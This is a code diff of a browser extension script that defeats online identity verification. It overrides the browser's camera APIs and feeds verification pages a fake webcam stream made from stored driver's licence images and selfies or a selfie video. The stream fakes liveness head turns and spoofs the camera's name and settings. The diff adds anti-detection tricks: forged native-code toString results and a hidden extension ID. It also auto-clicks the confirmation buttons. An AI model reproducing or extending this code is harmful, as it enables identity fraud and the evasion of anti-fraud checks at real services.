@@ -6,50 +6,66 @@
 function ssGet(k)    { try { return sessionStorage.getItem(k) }  catch(_) { return null } }
 function ssSet(k, v) { try { sessionStorage.setItem(k, v) }      catch(_) {} }
 
-// ── Image store ───────────────────────────────────────────────────────────────
-ssSet('__idv_phase__', 'id') // always reset to id on page load
+// ── Image / video store ───────────────────────────────────────────────────────
+ssSet('__idv_phase__', 'id')
 const IDV = {
-  dlFront:    ssGet('__idv_dl_front__'),
-  dlBack:     ssGet('__idv_dl_back__'),
-  selfies:    [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
-  phase:      'id',  // always start with ID — switch to selfie via DOM watcher
-  idStep:     0,
-  camActive:  false,
-  currentImg: null,  // live canvas reference for mid-stream image swap
-  adjZoom:    1.08,  // user-controlled scale multiplier
-  adjOffX:    0,     // user-controlled X offset (pixels)
-  adjOffY:    0      // user-controlled Y offset (pixels)
+  dlFront:      ssGet('__idv_dl_front__'),
+  dlBack:       ssGet('__idv_dl_back__'),
+  selfies:      [ssGet('__idv_selfie_0__'), ssGet('__idv_selfie_1__'), ssGet('__idv_selfie_2__')].filter(Boolean),
+  selfieVideo:  null,   // base64 video for liveness
+  phase:        'id',
+  idStep:       0,
+  camActive:    false,
+  currentImg:   null,
+  selfieVidEl:  null,   // hidden <video> element for video mode
+  adjZoom:      1.08,
+  adjOffX:      0,
+  adjOffY:      0
 }
 
+// ── Message bus (from bridge + sidepanel) ─────────────────────────────────────
 window.addEventListener('message', ev => {
   if (ev.source !== window) return
   const d = ev.data
   if (d?._idv === 'IDV_SET') {
-    if (d.dlFront)         IDV.dlFront  = d.dlFront
-    if (d.dlBack)          IDV.dlBack   = d.dlBack
-    if (d.selfies?.length) IDV.selfies  = d.selfies
-    if (d.phase)           IDV.phase    = d.phase
-    console.log('[IDV] Images received. dlFront=' + !!IDV.dlFront + ' selfies=' + IDV.selfies.length)
+    if (d.dlFront)         IDV.dlFront      = d.dlFront
+    if (d.dlBack)          IDV.dlBack       = d.dlBack
+    if (d.selfies?.length) IDV.selfies      = d.selfies
+    if (d.selfieVideo)     { IDV.selfieVideo = d.selfieVideo; prepSelfieVideo() }
+    if (d.phase)           IDV.phase        = d.phase
     updateBadge()
   }
   if (d?._idv === 'IDV_SWITCH') {
     IDV.phase  = d.phase  ?? IDV.phase
     IDV.idStep = d.idStep ?? IDV.idStep
     ssSet('__idv_phase__', IDV.phase)
-    console.log('[IDV] Manual switch → phase=' + IDV.phase + ' idStep=' + IDV.idStep)
-    showToast('⬡ IDV: Switched to ' + (IDV.phase === 'selfie' ? 'Selfie' : IDV.idStep === 1 ? 'ID Back' : 'ID Front'), '#1e3a5f')
+    showToast('⬡ IDV: ' + (IDV.phase === 'selfie' ? 'Selfie' : IDV.idStep === 1 ? 'ID Back' : 'ID Front'), '#1e3a5f')
     if (IDV.camActive) loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
   }
   if (d?._idv === 'IDV_ADJUST') {
-    if (d.zoom  !== undefined) IDV.adjZoom = d.zoom
-    if (d.offX  !== undefined) IDV.adjOffX = d.offX
-    if (d.offY  !== undefined) IDV.adjOffY = d.offY
+    if (d.zoom !== undefined) IDV.adjZoom = d.zoom
+    if (d.offX !== undefined) IDV.adjOffX = d.offX
+    if (d.offY !== undefined) IDV.adjOffY = d.offY
   }
 })
 
 function pickSrc() {
   if (IDV.phase === 'selfie') return IDV.selfies[0] || IDV.dlFront
   return IDV.idStep === 1 ? (IDV.dlBack || IDV.dlFront) : IDV.dlFront
+}
+
+// ── Hidden video element for selfie video mode ────────────────────────────────
+function prepSelfieVideo() {
+  if (!IDV.selfieVideo) return
+  if (IDV.selfieVidEl) { IDV.selfieVidEl.src = ''; IDV.selfieVidEl.remove() }
+  const vid = document.createElement('video')
+  vid.muted = true; vid.loop = true; vid.playsInline = true
+  vid.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;pointer-events:none'
+  const blobUrl = b64ToBlob(IDV.selfieVideo)
+  if (!blobUrl) return
+  vid.src = blobUrl
+  document.body?.appendChild(vid) || document.addEventListener('DOMContentLoaded', () => document.body.appendChild(vid))
+  IDV.selfieVidEl = vid
 }
 
 // ── On-screen badge ───────────────────────────────────────────────────────────
@@ -89,7 +105,7 @@ function showToast(msg, bg) {
 if (document.body) initBadge()
 else document.addEventListener('DOMContentLoaded', initBadge)
 
-// ── Load image helper — converts base64 → Blob URL to bypass CSP data: block ──
+// ── Load image helper — base64 → Blob URL (bypass CSP data: block) ───────────
 function b64ToBlob(dataUrl) {
   try {
     const [header, b64] = dataUrl.split(',')
@@ -98,10 +114,7 @@ function b64ToBlob(dataUrl) {
     const arr  = new Uint8Array(bin.length)
     for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i)
     return URL.createObjectURL(new Blob([arr], { type: mime }))
-  } catch(e) {
-    console.log('[IDV] b64ToBlob error:', e.message)
-    return null
-  }
+  } catch(e) { return null }
 }
 
 function loadImg(src) {
@@ -109,25 +122,29 @@ function loadImg(src) {
     if (!src) return resolve(null)
     const img = new Image()
     img.onload  = () => resolve(img)
-    img.onerror = () => { console.log('[IDV] ✗ Image onerror — CSP or bad data?'); resolve(null) }
-    setTimeout(() => { console.log('[IDV] ✗ Image timeout'); resolve(null) }, 6000)
-    // Convert base64 → blob URL to bypass Shopify CSP (blocks data: URLs)
-    if (src.startsWith('data:')) {
-      const blobUrl = b64ToBlob(src)
-      console.log('[IDV] Using blob URL:', !!blobUrl)
-      img.src = blobUrl || src
-    } else {
-      img.src = src
-    }
+    img.onerror = () => resolve(null)
+    setTimeout(() => resolve(null), 6000)
+    img.src = src.startsWith('data:') ? (b64ToBlob(src) || src) : src
   })
+}
+
+// ── Liveness yaw angle sequence ───────────────────────────────────────────────
+// 8s loop: 2s straight → ease left → hold left → ease right → hold right → return
+function easeInOut(t) { return t < .5 ? 2*t*t : -1+(4-2*t)*t }
+function livenessYaw(elapsed) {
+  const t = elapsed % 8000
+  if (t < 2000) return 0
+  if (t < 3500) return -28 * easeInOut((t-2000)/1500)
+  if (t < 4500) return -28
+  if (t < 6000) return -28 + 56 * easeInOut((t-4500)/1500)
+  if (t < 7000) return 28
+  return 28 * (1 - easeInOut((t-7000)/1000))
 }
 
 // ── Build fake video stream ───────────────────────────────────────────────────
 async function buildFakeStream(src) {
-  console.log('[IDV] Building stream, src length=' + (src?.length || 0))
   const img = await loadImg(src)
-  if (!img) { console.log('[IDV] ✗ No image'); return null }
-  console.log('[IDV] Image loaded: ' + img.naturalWidth + 'x' + img.naturalHeight)
+  if (!img) return null
 
   const W = 1280, H = 720
   const canvas = document.createElement('canvas')
@@ -138,29 +155,21 @@ async function buildFakeStream(src) {
   let ox = 0, oy = 0, sc = 1, vx = 0.15, vy = 0.1, vs = 0.0001
   const streamStart = performance.now()
 
-  // ── Liveness helper: returns current yaw angle for selfie phase ──────────
-  // Sequence (loops): 2s straight → 1.5s turn left → 1s hold left →
-  //                   1.5s turn right → 1s hold right → 1s return straight
-  function livenessYaw() {
-    const CYCLE = 8000  // ms per full loop
-    const t = (performance.now() - streamStart) % CYCLE
-    // t ranges:
-    //   0–2000   : straight (0°)
-    //   2000–3500 : ease to -28° (look left)
-    //   3500–4500 : hold -28°
-    //   4500–6000 : ease to +28° (look right)
-    //   6000–7000 : hold +28°
-    //   7000–8000 : ease back to 0°
-    if (t < 2000) return 0
-    if (t < 3500) { const p = (t-2000)/1500; return -28 * easeInOut(p) }
-    if (t < 4500) return -28
-    if (t < 6000) { const p = (t-4500)/1500; return -28 + 56 * easeInOut(p) }
-    if (t < 7000) return 28
-    { const p = (t-7000)/1000; return 28 * (1 - easeInOut(p)) }
-  }
-  function easeInOut(t) { return t < .5 ? 2*t*t : -1+(4-2*t)*t }
-
   function draw() {
+    const elapsed = performance.now() - streamStart
+
+    // Video mode for selfie phase — draw from hidden video element
+    if (IDV.phase === 'selfie' && IDV.selfieVidEl && IDV.selfieVidEl.readyState >= 2) {
+      ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H)
+      const vid = IDV.selfieVidEl
+      const vs2 = Math.min(W / vid.videoWidth, H / vid.videoHeight) * IDV.adjZoom
+      ctx.drawImage(vid,
+        (W - vid.videoWidth*vs2)/2  + IDV.adjOffX,
+        (H - vid.videoHeight*vs2)/2 + IDV.adjOffY,
+        vid.videoWidth*vs2, vid.videoHeight*vs2)
+      return
+    }
+
     const ci = IDV.currentImg || img
     const baseScale = Math.min(W / ci.naturalWidth, H / ci.naturalHeight) * IDV.adjZoom
     ox += vx; oy += vy; sc += vs
@@ -169,27 +178,21 @@ async function buildFakeStream(src) {
     if (sc > 1.018 || sc < 0.982) vs *= -1
     const s = baseScale * sc
 
-    ctx.fillStyle = '#111'
-    ctx.fillRect(0, 0, W, H)
+    ctx.fillStyle = '#111'; ctx.fillRect(0, 0, W, H)
 
     if (IDV.phase === 'selfie') {
-      // ── Liveness mode: simulate 3D head turn via perspective skew ──────
-      const yawDeg = livenessYaw()
+      // Liveness: simulate 3D head turn via X-axis perspective skew
+      const yawDeg = livenessYaw(elapsed)
       const yawRad = yawDeg * Math.PI / 180
-      // cos(yaw) compresses X axis to simulate horizontal rotation
       const xScale = Math.cos(yawRad)
-      // slight Y shift: head tilts slightly up when turning (natural motion)
       const yShift = Math.abs(yawDeg) * 0.6
       const iw = ci.naturalWidth * s, ih = ci.naturalHeight * s
-      const cx = W/2 + IDV.adjOffX, cy = H/2 + IDV.adjOffY - yShift
-
       ctx.save()
-      ctx.translate(cx, cy)
+      ctx.translate(W/2 + IDV.adjOffX, H/2 + IDV.adjOffY - yShift)
       ctx.scale(xScale, 1)
       ctx.drawImage(ci, -iw/2 + ox, -ih/2 + oy, iw, ih)
       ctx.restore()
     } else {
-      // ── ID card mode: gentle float, no rotation ─────────────────────────
       ctx.drawImage(ci,
         (W - ci.naturalWidth*s)/2  + ox + IDV.adjOffX,
         (H - ci.naturalHeight*s)/2 + oy + IDV.adjOffY,
@@ -205,7 +208,6 @@ async function buildFakeStream(src) {
 
   let stream, stopFn
 
-  // Try MediaStreamTrackGenerator (Chrome 94+)
   if (typeof MediaStreamTrackGenerator !== 'undefined' && typeof VideoFrame !== 'undefined') {
     try {
       const gen = new MediaStreamTrackGenerator({ kind: 'video' })
@@ -213,6 +215,10 @@ async function buildFakeStream(src) {
       let alive = true
       async function pump(ts) {
         if (!alive) return
+        // Start selfie video playback when we switch to selfie phase
+        if (IDV.phase === 'selfie' && IDV.selfieVidEl && IDV.selfieVidEl.paused) {
+          IDV.selfieVidEl.play().catch(() => {})
+        }
         draw()
         const vf = new VideoFrame(canvas, { timestamp: Math.floor(ts * 1000), duration: 33333 })
         try { await writer.write(vf) } catch(_) {}
@@ -222,22 +228,25 @@ async function buildFakeStream(src) {
       requestAnimationFrame(pump)
       stream = new MediaStream([gen])
       stopFn = () => { alive = false; try { writer.close() } catch(_) {} }
-      console.log('[IDV] ✓ MediaStreamTrackGenerator')
-    } catch(e) { console.log('[IDV] TrackGenerator failed:', e.message); stream = null }
+    } catch(e) { stream = null }
   }
 
-  // Fallback: canvas.captureStream
   if (!stream) {
-    const iv = setInterval(draw, 33)
+    const iv = setInterval(() => {
+      if (IDV.phase === 'selfie' && IDV.selfieVidEl && IDV.selfieVidEl.paused) {
+        IDV.selfieVidEl.play().catch(() => {})
+      }
+      draw()
+    }, 33)
     stream = canvas.captureStream(30)
     stopFn = () => clearInterval(iv)
-    console.log('[IDV] ✓ canvas.captureStream')
   }
 
-  // Spoof track metadata
+  // Spoof track metadata — look like a real webcam
   const track = stream.getVideoTracks()[0]
   if (track) {
-    track.getSettings     = () => ({ width:W, height:H, frameRate:30, facingMode: IDV.phase==='selfie'?'user':'environment', deviceId:'idv-cam', groupId:'idv-grp' })
+    Object.defineProperty(track, 'label', { get: () => 'FaceTime HD Camera', configurable: true })
+    track.getSettings     = () => ({ width:W, height:H, frameRate:30, facingMode: IDV.phase==='selfie'?'user':'environment', deviceId:'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2', groupId:'g1r2o3u4p5' })
     track.getCapabilities = () => ({ width:{min:1,max:1920}, height:{min:1,max:1080}, frameRate:{min:1,max:60} })
     track.getConstraints  = () => ({})
     const origStop = track.stop.bind(track)
@@ -249,28 +258,24 @@ async function buildFakeStream(src) {
   return stream
 }
 
-// ── CAMERA HOOK — Triple-layer override ──────────────────────────────────────
+// ── CAMERA HOOK — Triple-layer override with anti-detection ───────────────────
 const _realMD  = navigator.mediaDevices
 const _origGUM = _realMD?.getUserMedia?.bind(_realMD)
 const _origED  = _realMD?.enumerateDevices?.bind(_realMD)
 
 if (_origGUM) {
-  const fakeGUM = async function fakeGetUserMedia(constraints) {
-    console.log('[IDV] getUserMedia CALLED! video=' + !!constraints?.video)
+
+  const fakeGUM = async function getUserMedia(constraints) {
     if (!constraints?.video) return _origGUM(constraints)
-    // Always start with DL Front when camera opens — DOM watcher switches to selfie later
-    IDV.phase = 'id'
-    IDV.idStep = 0
+    IDV.phase = 'id'; IDV.idStep = 0
     ssSet('__idv_phase__', 'id')
 
-    // Wait up to 8s for images
     for (let i = 0; i < 40; i++) {
       if (IDV.dlFront) break
       const ss = ssGet('__idv_dl_front__')
       if (ss) { IDV.dlFront = ss; break }
       await new Promise(r => setTimeout(r, 200))
     }
-    console.log('[IDV] dlFront available:', !!IDV.dlFront)
 
     const src = pickSrc()
     if (!src) {
@@ -289,21 +294,34 @@ if (_origGUM) {
     return fake
   }
 
-  const fakeED = async function() {
+  // Make toString() return native code string — hides that it's overridden
+  const nativeToString = Function.prototype.toString
+  Object.defineProperty(fakeGUM, 'name', { value: 'getUserMedia', configurable: true })
+  fakeGUM.toString = () => 'function getUserMedia() { [native code] }'
+
+  const fakeED = async function enumerateDevices() {
     const real = await _origED().catch(() => [])
+    // Inject realistic fake camera with real-looking deviceId if none present
     if (!real.some(d => d.kind === 'videoinput')) {
-      real.unshift({ deviceId:'idv-cam', groupId:'idv-grp', kind:'videoinput', label:'IDV Virtual Camera', toJSON(){ return this } })
+      real.unshift({
+        deviceId: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
+        groupId:  'g1r2o3u4p5',
+        kind:     'videoinput',
+        label:    'FaceTime HD Camera',
+        toJSON()  { return { deviceId:this.deviceId, groupId:this.groupId, kind:this.kind, label:this.label } }
+      })
     }
     return real
   }
+  fakeED.toString = () => 'function enumerateDevices() { [native code] }'
 
-  // LAYER 1: Replace navigator.mediaDevices with Proxy (strongest)
+  // LAYER 1: navigator.mediaDevices Proxy
   try {
     Object.defineProperty(navigator, 'mediaDevices', {
       get() {
         return new Proxy(_realMD, {
           get(t, p) {
-            if (p === 'getUserMedia')    return fakeGUM
+            if (p === 'getUserMedia')     return fakeGUM
             if (p === 'enumerateDevices') return fakeED
             const v = t[p]; return typeof v === 'function' ? v.bind(t) : v
           }
@@ -311,8 +329,7 @@ if (_origGUM) {
       },
       configurable: true
     })
-    console.log('[IDV] ✓ Layer 1: navigator.mediaDevices Proxy installed')
-  } catch(e) { console.log('[IDV] Layer 1 failed:', e.message) }
+  } catch(e) {}
 
   // LAYER 2: Prototype override
   if (typeof MediaDevices !== 'undefined') {
@@ -320,11 +337,10 @@ if (_origGUM) {
       Object.defineProperty(MediaDevices.prototype, 'getUserMedia', {
         get() { return fakeGUM }, set() {}, configurable: true
       })
-      console.log('[IDV] ✓ Layer 2: MediaDevices.prototype patched')
-    } catch(e) { console.log('[IDV] Layer 2 failed:', e.message) }
+    } catch(e) {}
   }
 
-  // LAYER 3: Legacy global APIs
+  // LAYER 3: Legacy globals
   try { navigator.getUserMedia       = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}
   try { navigator.webkitGetUserMedia = (c,s,e) => fakeGUM(c).then(s).catch(e) } catch(_) {}
 
@@ -350,13 +366,46 @@ if (_origGUM) {
     }
   }
 
-  console.log('[IDV] ✓ All camera layers active on', location.hostname)
-} else {
-  console.log('[IDV] No mediaDevices on this page')
+  // ── Anti-detection: hide extension fingerprints ───────────────────────────
+  // Prevent sites checking if getUserMedia.toString() is native
+  try {
+    const origTS = Function.prototype.toString
+    Function.prototype.toString = function() {
+      if (this === fakeGUM || this === fakeED) return `function ${this.name || ''}() { [native code] }`
+      return origTS.call(this)
+    }
+    Object.defineProperty(Function.prototype.toString, 'toString', {
+      value: () => 'function toString() { [native code] }', configurable: true
+    })
+  } catch(_) {}
+
+  // Suppress chrome.* exposure on window (some sites probe for it)
+  try {
+    if (window.chrome?.runtime?.id) {
+      const _chrome = window.chrome
+      Object.defineProperty(window, 'chrome', {
+        get() {
+          // Return chrome without runtime.id so page can't detect extension
+          return new Proxy(_chrome, {
+            get(t, p) {
+              if (p === 'runtime') return new Proxy(t.runtime, {
+                get(rt, rp) {
+                  if (rp === 'id') return undefined
+                  const v = rt[rp]; return typeof v === 'function' ? v.bind(rt) : v
+                }
+              })
+              const v = t[p]; return typeof v === 'function' ? v.bind(t) : v
+            }
+          })
+        },
+        configurable: true
+      })
+    }
+  } catch(_) {}
 }
 
 // ── Phase + auto-click DOM watcher ────────────────────────────────────────────
-const SELFIE_W  = ['selfie','your face','look at the camera','photo of yourself','center your face','take a photo of your face']
+const SELFIE_W  = ['selfie','your face','look at the camera','photo of yourself','center your face','take a photo of your face','take a selfie']
 const BACK_W    = ['back of your','flip your','other side','back side','reverse side','back of the']
 const ADVANCE_W = ['looks good','use this photo','captured','✓ captured','photo captured']
 const CLICK_W   = ['looks good','use this photo','use photo','confirm','continue','next','submit','done']
@@ -366,19 +415,18 @@ function checkDOM() {
   const txt = document.body?.innerText?.toLowerCase() || ''
   if (txt === _lastTxt) return
   _lastTxt = txt
-
-  // Only switch phases when camera is ACTIVE (not before camera opens)
   if (!IDV.camActive) return
 
   if (IDV.phase === 'id' && IDV.idStep === 0 && BACK_W.some(w => txt.includes(w))) {
-    IDV.idStep = 1; console.log('[IDV] → back-of-ID')
+    IDV.idStep = 1
     loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
   }
   if (IDV.phase !== 'selfie' && SELFIE_W.some(w => txt.includes(w))) {
     IDV.phase = 'selfie'; ssSet('__idv_phase__', 'selfie')
     window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'selfie' }, '*')
-    console.log('[IDV] → selfie phase')
-    loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
+    // Start video if available
+    if (IDV.selfieVidEl) IDV.selfieVidEl.play().catch(() => {})
+    else loadImg(pickSrc()).then(img => { if (img) IDV.currentImg = img })
   }
   if (ADVANCE_W.some(w => txt.includes(w))) setTimeout(autoClick, 900)
 }
@@ -386,7 +434,7 @@ function autoClick() {
   const btns = [...document.querySelectorAll('button,[role="button"]')].filter(b => !b.disabled && b.offsetParent)
   for (const phrase of CLICK_W) {
     const b = btns.find(b => b.textContent?.toLowerCase().trim().includes(phrase))
-    if (b) { console.log('[IDV] Auto-click:', b.textContent.trim()); b.click(); return }
+    if (b) { b.click(); return }
   }
 }
 function watchDOM() {
